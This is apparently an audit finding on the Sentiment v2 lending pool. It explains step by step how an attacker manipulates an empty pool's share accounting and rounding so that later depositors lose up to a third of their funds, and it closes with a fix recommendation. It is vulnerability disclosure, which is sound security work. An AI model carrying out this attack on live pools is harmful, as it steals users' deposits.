# rounding error due to internal accounting and can steal some portion of the first depositors  funds

## Summary

## Vulnerability Detail

- where: All basepool 
- when: Total Supply of a pool is zero 

- When total supply of pool is zero an attacker goes ahead and executes the following steps

1. mint some asset and deposit some collateral sufficient to borrow those assets. 
2. Borrow a few of those assets and wait for a few block. In 100 second when at least more than 1wei interest has occurred, repay all the borrowed funds.
3. [to match this condition ](https://github.com/sentimentxyz/protocol-v2/blob/master/src/Pool.sol#L361) attacker will directly transfer some funds because[ total balance](https://github.com/sentimentxyz/protocol-v2/blob/master/src/Pool.sol#L360) is calculate like using balanceof(Address(this)) 
4. after this withdraw all but 2 wei of shares. to makes it so that the totalDepositShares = 1 and totalDepositAssets = 2 due to rounding.
- Now attacker takes advantage of rounding down when depositing to inflate the price of a share.


In a loop attacker does the following till they get their desired price of 1 share

- deposit totalDeposits + 1 assets and withdraw  1 shares 
  - according to `convertToShares = assets.mulDiv(totalShares, totalAssets, rounding);`
  - it mints  `shares = (amount * total.shares) / total.amount` of shares.
  - Since the attacker has deposited totalDeposits + 1 assets and totalDepositShares is 1, shares = (totalDeposits  + 1 * 1) / totalDeposits = 1 
  - This should have been 1.9999... but due to rounding down, the attacker gets minted 1 shares is minted
  - 
  - and attacker withdrew in the same 1 wei transactions . 
  - This means at this point `totalDepositShares = 1+1 (minted shares )- 1 (withdrew amount )= 1` and `totalDeposits = totalDeposits + totalDeposits + 1`
  - In this loop the supply stays at 1 and totalDeposits increase exponentially. Take a look at the POC to get a better idea.
 

So when a user comes to the deposit get some shares but they lose of assets which get proportionally divided between existing share holders (including the attacker) due to rounding errors.
- users keep losing up to 33% of their assets. (see [here](https://www.desmos.com/calculator/0hrgaxkdyr))
- This means that for users to not lose value, they have to make sure that they have to deposit exact proportion of the attacker shares is an integer.


## Impact
- Loss of 33% of all pool 1st depositor funds

## Recommendation
I like how [BalancerV2](https://github.com/balancer-labs/balancer-v2-monorepo/blob/master/pkg/pool-utils/contracts/BasePool.sol#L307-L325) and [UniswapV2](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L121) do it
